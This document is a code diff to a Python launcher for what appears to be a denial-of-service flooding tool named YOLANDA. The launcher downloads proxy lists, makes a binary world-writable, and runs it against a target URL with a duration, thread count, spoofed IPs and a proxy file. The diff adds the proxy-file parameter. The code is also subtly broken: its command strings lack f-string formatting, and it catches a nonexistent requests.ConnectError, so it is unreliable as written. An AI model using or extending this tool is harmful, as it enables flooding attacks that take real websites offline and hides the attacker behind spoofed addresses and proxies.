@@ -15,6 +15,7 @@ class YOLANDA:
 		self._time = time
 		self._spoofIP = spoofIP
 		self._thread = thread
+		self._fproxy = "proxy.txt"
 
 	def getproxy(self) -> None:
 		print("[+] Checking Proxy Providers...")
@@ -22,7 +23,7 @@ class YOLANDA:
 			print("[+] Downloading Proxies...")
 			for url in readurl:
 				url = url.strip()
-				with open("proxy.txt", mode="a") as file:
+				with open(self._fproxy, mode="a") as file:
 					try:
 						file.write(requests.get(url, timeout=1000).text)
 					except requests.ConnectError:
@@ -38,7 +39,7 @@ class YOLANDA:
 	def start(self) -> None:
 		print("[+] Executing...")
 		run(["chmod 777 YOLANDA"], shell=True)
-		run(["./YOLANDA {self._target} {self._time} {self._spoofIP} {self._thread}"], shell=True)
+		run(["./YOLANDA {self._target} {self._time} {self._thread} {self._spoofIP} {self._fproxy}"], shell=True)
 
 
 if __name__ == "__main__":
@@ -50,5 +51,5 @@ if __name__ == "__main__":
 			yolanda.getproxy()
 			yolanda.start()
 	except Exception:
-		print("\033cUsage:\n python3 start.py [TagetURL] [Time] [spoofIP] [Thread]")
-		exit("Example:\n python3 start.py https://website.com 1200 (8.8.8.8 or spoofIP.txt) 1")
+		print("\033cUsage:\n python3 start.py [TagetURL] [Time] [Thread] [spoofIP] [Proxyfile]")
+		exit("Example:\n python3 start.py https://website.com 1200 1 spoofIP.txt) proxy.txt")
